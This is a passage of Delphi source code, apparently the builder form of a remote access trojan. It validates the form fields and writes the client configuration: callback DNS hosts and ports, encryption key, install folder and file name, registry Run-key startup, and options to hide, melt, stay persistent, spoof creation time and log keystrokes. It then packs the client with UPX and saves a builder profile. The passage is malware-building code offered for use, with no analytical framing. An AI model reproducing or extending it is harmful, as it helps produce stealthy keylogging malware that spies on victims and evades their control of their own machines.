    TmpStr := edtId.Text;
    TmpStr := MyReplaceStr(TmpStr, '%ID%', RandomString(5));
    Configuration.ClientId := TmpStr;
  end
  else
  begin
    pgc2.ActivePageIndex := 0;
    edtId.SetFocus;
    edtId.Color := clRed;   
    Exit;
  end;

  Configuration.Mutex := edtMutex.Text;

  if lvDNS.Items.Count <> 0 then
  begin
    TmpStr := '';
    
    for i := 0 to lvDNS.Items.Count -1 do
    begin
      TmpStr := TmpStr + lvDNS.Items.Item[i].Caption + '|';
      TmpStr1 := TmpStr1 + lvDNS.Items.Item[i].SubItems[0] + '|';
    end;

    Configuration.DNSList := TmpStr;
    Configuration.PortsList := TmpStr1;
  end
  else
  begin               
    pgc2.ActivePageIndex := 1;
    lvDNS.SetFocus;
    lvDNS.Color := clRed;     
    Exit;
  end;

  Configuration.Delay := seDelay.Value;
  Configuration.EncryptionKey := edtEncryption2.Text;
  Configuration.Install := chkInstallation.Checked;

  if chkInstallation.Checked then //check only if installation boolean is true
  begin
    i := cbbDestination.ItemIndex;
    if i <> -1 then Configuration.Destination := cbbDestination.Items.Strings[i] else
    begin
	  pgc2.ActivePageIndex := 2;
      cbbDestination.SetFocus;
      cbbDestination.Color := clRed;
      Exit;
    end;

    if edtFolder.Text <> '' then Configuration.Foldername := edtFolder.Text else
    begin
      pgc2.ActivePageIndex := 2;
      edtFolder.SetFocus;
      edtFolder.Color := clRed;
      Exit;
    end;

    if edtFile.Text <> '' then Configuration.Filename := edtFile.Text + '.exe' else
    begin
      pgc2.ActivePageIndex := 2;
      edtFile.SetFocus;
      edtFile.Color := clRed;
      Exit;
    end;
  end;

  Configuration.Startup := chkRegStartup.Checked;
  Configuration.HKLM := chkHKLM.Checked;
  Configuration.HKCU := chkHKCU.Checked;

  if (chkRegStartup.Checked) then
  begin
    if((chkHKLM.Checked) or (chkHKCU.Checked)) and (edtValue.Text <> '') then
      Configuration.RegValue := edtValue.Text
    else
    begin
      pgc2.ActivePageIndex := 2;
      edtValue.SetFocus;
      edtValue.Color := clRed;
      Exit;
    end;
  end;

  Configuration.Hide := chkHide.Checked;
  Configuration.Melt := chkMelt.Checked;
  Configuration.Persistence := chkPersistence.Checked;
  Configuration.CreationTime := chkTime.Checked;
  Configuration.Keylogger := chkKeylogger.Checked;

  if SaveConfiguration(ClientFile, 'CFG', Configuration) = False then
  begin
    ShowMessage('Failed to build client.'); //something went wrong...
    Exit;
  end;

  if chkUpx.Checked = True then //compress client file with upx
  begin
    if FileExists(ExtractFilePath(ParamStr(0)) + 'upx.exe') = False then
      ShowMessage('Upx file not found.')
    else                                               //best compression parameters
      ExecAndWait('"' + ExtractFilePath(ParamStr(0)) + 'upx.exe" -9 -f "' + ClientFile + '"', SW_HIDE);
  end;

  if chkSave.Checked then //save current profile
  begin
    Config := TJSONConfig.Create(ExtractFilePath(ParamStr(0)) + 'Builder.profile', MainPassword);
    Config.WriteString('Client Id', edtId.Text);

    TmpStr := '';
    for i := 0 to lvDNS.Items.Count -1 do
    TmpStr := TmpStr + lvDNS.Items.Item[i].Caption + ':' + lvDNS.Items.Item[i].SubItems[0] + ':|';

    Config.WriteString('Host list', TmpStr);
    Config.WriteString('Encryption key', edtEncryption2.Text);
    Config.WriteString('Folder', edtFolder.Text);
    Config.WriteString('Filename', edtFile.Text);
    Config.WriteString('Startup value', edtValue.Text);

    i := cbbDestination.ItemIndex;
    if i <> -1 then Config.WriteInteger('Destination', i);
    Config.WriteInteger('Delay', seDelay.Value);

    Config.WriteBool('Installation', chkInstallation.Checked);
    Config.WriteBool('Startup', chkRegStartup.Checked);
    Config.WriteBool('HKLM', chkHKLM.Checked);
    Config.WriteBool('HKCU', chkHKCU.Checked);
    Config.WriteBool('Hide', chkHide.Checked);
    Config.WriteBool('Melt', chkMelt.Checked);
    Config.WriteBool('Persistence', chkPersistence.Checked);
    Config.WriteBool('Creation time', chkTime.Checked);
    Config.WriteBool('Keylogger', chkKeylogger.Checked);

    Config.SaveConfig;
    Config.Free;
  end;

  //set colors to origin value if success
  edtId.Color := clWindow;
  edtFolder.Color := clWindow;
  edtValue.Color := clWindow;
  edtEncryption2.Color := clWindow;
  edtDNS.Color := clWindow;
  edtFile.Color := clWindow;

  ShowMessage('Done!'); //the end!
end;

end.
